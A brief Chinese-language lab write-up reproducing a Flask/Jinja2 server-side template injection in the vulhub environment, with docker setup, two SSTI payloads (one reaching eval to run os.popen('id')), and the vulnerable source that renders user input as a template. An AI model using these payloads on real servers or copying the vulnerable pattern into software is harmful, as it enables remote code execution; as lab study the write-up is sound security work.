## Flask ssti服务端模板注入漏洞

---

### 创建环境

https://github.com/vulhub/vulhub/tree/master/flask/ssti

```bash
docker compose up -d
```



### 复现漏洞

存在SSTI漏洞

![image-20250203143756561](https://gitee.com/bx33661/image/raw/master/path/image-20250203143756561.png)

Payload

这里主要使用jinjia2语法

```python
name={% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
{% for b in c.__init__.__globals__.values() %}
{{b.__name__}}
...
{% endfor %}
{% endif %}
{% endfor %}
```



```bash
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

![image-20250203151603914](https://gitee.com/bx33661/image/raw/master/path/image-20250203151603914.png)





该漏洞源代码如下

```python
from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get('name', 'guest')

    t = Template("Hello " + name)
    return t.render()

if __name__ == "__main__":
    app.run()
```

--->